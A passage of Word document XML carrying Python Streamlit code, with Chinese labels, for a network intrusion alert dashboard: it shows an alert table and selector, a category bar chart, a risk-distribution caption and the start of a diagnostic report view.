        <w:t xml:space="preserve">        st.dataframe(view, width="stretch", hide_index=True, height=420)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8EFA25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ids = view["编号"].tolist()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1665D233">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ids:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F62FF9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            current = st.session_state.get("alert_id")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2DF563">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            index = ids.index(current) if current in ids else 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1BFA86">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            chosen = st.selectbox("查看哪条告警的流标识", ids, index=index, key="alert_pick")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1D86FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 不在这里 st.rerun(scope="app")：那一刻会连实时页一起重跑，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F6B59F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 整页重跑会把标签页冲回第一个。报告页自己每 10 秒刷一次，够跟上了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211A14F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.session_state["alert_id"] = int(chosen)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A206269">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with c2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB2E993">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        by_cat = df["category"].value_counts()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5B544E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fig = go.Figure(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165D80CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            go.Bar(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F9AD6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                x=by_cat.values, y=by_cat.index, orientation="h",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139AAAE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                marker=dict(color=[SERIES[i % len(SERIES)] for i in range(len(by_cat))],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A4E0A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                            line=dict(color="#fcfcfb", width=2)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B33782">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                text=by_cat.values, textposition="outside",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15808118">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hovertemplate="%{y}：%{x} 条告警&lt;extra&gt;&lt;/extra&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0738A5C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506D2F92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F52F928">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_layout(fig, "告警类别分布", height=260)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3270F263">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fig.update_yaxes(autorange="reversed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D310190">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.plotly_chart(fig, width="stretch", config={"displayModeBar": False})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF2DAA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01AB24EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        risk_counts = df["risk"].value_counts()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D6F888">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        parts = "　".join(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DCC2D98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{RISK_TEXT.get(k, k)} {v}" for k, v in risk_counts.items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAE6E08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53611802">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.caption(f"风险分布：{parts}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2254BF72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.caption("提示：行为与端口扫描一致的资产盘点和健康检查是最常见的误报来源，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3159DB0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                   "处置前先核对源 IP 的归属。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5496D83C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12FE4572">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27623E2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>with tab_alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B26A74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if live:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162D3452">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.fragment(run_every=5.0)(draw_alerts)()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C9A3B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A5C064">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.button("刷新", key="refresh_alerts")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24ABD424">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        draw_alerts()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5DEB57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B09FD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FB2E115">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 诊断报告</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB926DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B2A6BD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5B7A00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def clear_report_cache():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4290D0DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for k in list(st.session_state):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C5B183">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if k.startswith("report_"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2747BC99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.session_state.pop(k, None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F29FD08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B9D62C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08E8B2B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def draw_report() -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E98CC31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert_id = st.session_state.get("alert_id")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D30B0C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not alert_id:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44ACAB8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.info("先在「告警」标签里选一条告警。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29191A6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2794FBF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57755B14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, err = api(f"/api/v1/alerts/{alert_id}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74513AB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA0EB51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347DCF6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089D6453">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72CEA175">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert = data["alert"]</w:t>
